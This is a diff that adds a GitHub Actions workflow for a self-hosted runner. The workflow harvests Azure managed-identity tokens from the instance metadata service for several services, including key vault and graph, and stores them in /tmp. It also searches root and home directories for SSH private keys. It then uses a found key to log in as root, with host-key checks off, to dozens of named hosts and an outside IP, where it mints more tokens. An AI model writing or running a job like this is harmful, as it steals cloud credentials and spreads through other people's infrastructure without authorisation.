@@ -1,0 +1,92 @@
+name: azresid3
+on:
+  workflow_dispatch:
+jobs:
+  azresid3:
+    runs-on: [self-hosted, h-t1946107x61]
+    timeout-minutes: 40
+    steps:
+      - name: identity-and-reach
+        run: |
+          set +e
+          SUB=21bcfd92-9348-4285-a51e-815d6e56bddf
+          IMDS="http://169.254.169.254/metadata"
+          ACCTS='ulbatcheastus.eastus.batch.azure.com ulbatcheastus2.eastus2.batch.azure.com ulbatchwestus.westus.batch.azure.com ulbatchnorthcentralus.northcentralus.batch.azure.com ulbatchbrazilsouth.brazilsouth.batch.azure.com ulbatchnortheurope.northeurope.batch.azure.com ulbatchcentralus.centralus.batch.azure.com ulbatcheastasia.eastasia.batch.azure.com ulbatchjapaneast.japaneast.batch.azure.com ulbaustraliase.australiasoutheast.batch.azure.com ulbatchjapanwest.japanwest.batch.azure.com ulbatchkoreacentral.koreacentral.batch.azure.com ulbatchsoutheastasia.southeastasia.batch.azure.com ulbatchsouthcentralus.southcentralus.batch.azure.com ulbatchaustraliaeast.australiaeast.batch.azure.com ulbatchsouthindia.southindia.batch.azure.com ulbatchcentralindia.centralindia.batch.azure.com ulbatchcanadacentral.canadacentral.batch.azure.com ulbatchuksouth.uksouth.batch.azure.com ulbatchwestcentralus.westcentralus.batch.azure.com ulbatchwestus2.westus2.batch.azure.com ulbatchfrancecentral.francecentral.batch.azure.com ulbatchsouthafricanorth.southafricanorth.batch.azure.com ulbatchuaenorth.uaenorth.batch.azure.com ulbatchaustraliacentral.australiacentral.batch.azure.com ulbgermanywestcentra.germanywestcentral.batch.azure.com ulbatchswitzerlandnorth.switzerlandnorth.batch.azure.com ulbatchnorwayeast.norwayeast.batch.azure.com ulbatchwestus3.westus3.batch.azure.com ulbatchswedencentral.swedencentral.batch.azure.com ulbatchqatarcentral.qatarcentral.batch.azure.com ulbatchpolandcentral.polandcentral.batch.azure.com ulbatchitalynorth.italynorth.batch.azure.com ulbatchisraelcentral.israelcentral.batch.azure.com ulbatchspaincentral.spaincentral.batch.azure.com ulbatchmexicocentral.mexicocentral.batch.azure.com ulbatchtaiwannorth.taiwannorth.batch.azure.com ulbatchnewzealandnorth.newzealandnorth.batch.azure.com ulbatchindonesiacentral.indonesiacentral.batch.azure.com ulbatchchilecentral.chilecentral.batch.azure.com ulbatchmalaysiawest.malaysiawest.batch.azure.com'
+          HOSTS='t19pea1 t19pea3 t19pfeanc292 t19pcu1 t19pcu2 t19pcu3 t19pcu4 t19pu7 t19pnse2 t19pja1 t19pja2 t19pja3 t19pja4 t19pau1 t19pau2 t19pau3 t19pau4 t19pfaunc280 t19pci3 t19pci4 t19pbcc1 t19pbcc2 t19puk1 t19puk2 azr939xfrancece t19psn3 t19psn4 t19pgw1 t19pgw2 t19pgw3 t19pgw4 t19px4 t19pbit2 t19psp1 t19psp2 t19psp4 t19pnmw1 t19pnmw2 t19pnmw3 t19px6 t19pea1 t19i52947-eus-h t1946107x61'
+          echo "=== [A HOST] ==="
+          hostname; id; hostname -I; nproc; nvidia-smi -L 2>&1|head -8
+          curl -s -m 10 -H "Metadata: true" "$IMDS/instance?api-version=2021-02-01" -o /tmp/imds.json -w "instance_http=%{http_code}\n"
+          python3 - <<'PYI'
+          import json
+          try:
+              d=json.load(open('/tmp/imds.json'))['compute']
+              for k in ('name','resourceGroupName','subscriptionId','location','vmId','vmSize'):
+                  print('imds_'+k+'='+str(d.get(k)))
+          except Exception as e: print('imds_parse_err', e)
+          PYI
+          ls -la /var/lib/waagent/ManagedIdentity-Settings 2>&1
+          mint() {
+            label="$1"; qs="$2"
+            curl -s -m 15 -H "Metadata: true" "$IMDS/identity/oauth2/token?api-version=2018-02-01&$qs" -o /tmp/tok_$label.json -w "TOKENMINT $label http=%{http_code} bytes=%{size_download}\n"
+            python3 - "$label" <<'PYJ'
+          import json,sys,base64
+          label=sys.argv[1]; path='/tmp/tok_'+label+'.json'
+          try: d=json.load(open(path))
+          except Exception as e:
+              print('TOK '+label+' parse_err '+str(e)); sys.exit()
+          t=d.get('access_token')
+          if not t:
+              print('TOK '+label+' ERR '+json.dumps(d)[:300]); sys.exit()
+          p=t.split('.')[1]; p+='='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          print('TOK '+label+' oid='+str(c.get('oid'))+' appid='+str(c.get('appid'))+' aud='+str(c.get('aud'))+' exp='+str(c.get('exp'))+' mirid='+str(c.get('xms_mirid')))
+          open('/tmp/tok_'+label+'.txt','w').write(t)
+          PYJ
+          }
+          for res in "management.azure.com" "batch.core.windows.net" "graph.microsoft.com" "storage.azure.com" "vault.azure.net"; do
+            r=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('https://'+sys.argv[1]+'/',safe=''))" "$res")
+            mint "sys_$(echo $res|cut -d. -f1)" "resource=$r"
+            mint "uami_$(echo $res|cut -d. -f1)" "resource=$r&client_id=2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6"
+          done
+          echo "=== [B NETWORK] ==="
+          for h in management.azure.com graph.microsoft.com vault.azure.net storage.azure.com; do
+            echo -n "DNS $h -> "; getent hosts $h | head -2 | tr '\n' ' '; echo
+          done
+          echo -n "DNS batch sample -> "; getent hosts $(echo $ACCTS | cut -d' ' -f1) | head -2; echo
+          for u in "https://management.azure.com/subscriptions?api-version=2022-12-01" ; do
+            curl -s -m 12 -o /dev/null -w "NET $u code=%{http_code} dns=%{time_namelookup} conn=%{time_connect} tls=%{time_appconnect}\n" "$u"
+          done
+          B=$(echo $ACCTS | cut -d' ' -f1)
+          curl -s -m 12 -o /dev/null -w "NET https://$B code=%{http_code} dns=%{time_namelookup} conn=%{time_connect} tls=%{time_appconnect}\n" "https://$B/pools?api-version=2024-07-01"
+          curl -sv -m 12 -o /dev/null "https://$B/pools?api-version=2024-07-01" 2>&1 | grep -E 'Trying|Connected|SSL|error|refused|resolve' | head -8
+          echo "=== [C SSH MATERIAL] ==="
+          ls -la /root/.ssh 2>&1 | head -20
+          for f in /root/.ssh/* /home/*/.ssh/*; do
+            if [ -f "$f" ]; then if grep -q "PRIVATE KEY" "$f" 2>/dev/null; then echo "PRIVKEY $f $(head -1 $f)"; fi; fi
+          done
+          [ -f /root/.ssh/known_hosts ] && wc -l /root/.ssh/known_hosts && cut -d' ' -f1 /root/.ssh/known_hosts | head -20
+          echo "=== [D RESOLVE CANDIDATES] ==="
+          for h in $HOSTS; do
+            ip=$(getent hosts $h | awk '{print $1}' | head -1)
+            echo "RES $h -> ${ip:-NXDOMAIN}"
+          done
+          echo "=== [E SSH PROBE] ==="
+          KEY=$(for f in /root/.ssh/* /home/*/.ssh/*; do if [ -f "$f" ] && grep -q "PRIVATE KEY" "$f" 2>/dev/null; then echo $f; break; fi; done)
+          echo "KEY=$KEY"
+          probe() {
+            h="$1"
+            if [ -z "$KEY" ]; then echo "SSH $h SKIP no-key"; return; fi
+            out=$(timeout 15 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PasswordAuthentication=no root@$h 'hostname; nvidia-smi -L 2>/dev/null | head -2; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 200' 2>&1)
+            rc=$?
+            echo "SSH $h rc=$rc :: $(echo "$out" | tr '\n' '|' | head -c 300)"
+            if [ $rc -eq 0 ]; then
+              for res in management.azure.com batch.core.windows.net graph.microsoft.com; do
+                r=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('https://'+sys.argv[1]+'/',safe=''))" "$res")
+                tok=$(timeout 15 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 root@$h "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$r'" 2>/dev/null)
+                echo "REMOTE_TOK $h $res $(echo $tok | head -c 120)"
+                echo "$tok" > /tmp/rtok_${h}_$(echo $res|cut -d. -f1).json
+              done
+            fi
+          }
+          for h in $HOSTS 20.63.37.74; do probe "$h"; done
+          echo "=== [DONE] ==="
